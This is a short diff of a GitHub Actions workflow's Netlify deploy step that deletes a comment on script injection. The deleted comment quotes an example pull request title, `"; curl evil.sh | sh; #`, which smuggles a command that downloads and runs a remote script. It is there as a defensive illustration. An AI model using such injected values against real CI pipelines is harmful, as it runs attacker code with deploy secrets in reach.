@@ -138,9 +138,6 @@ jobs:
       - name: Deploy to Netlify
         id: deploy
         if: success() && (github.ref == 'refs/heads/main' || github.event_name == 'pull_request')
-        # Event data reaches the script as env vars, never as inline ${{ }}. Those are pasted in as
-        # text before bash sees the script, so a PR titled `"; curl evil.sh | sh; #` would otherwise
-        # run on the runner with the deploy token in scope.
         run: |
           if [ "$GITHUB_REF" = "refs/heads/main" ]; then
             netlify deploy --prod --no-build --dir=build --message="Production deploy @ $GITHUB_SHA"
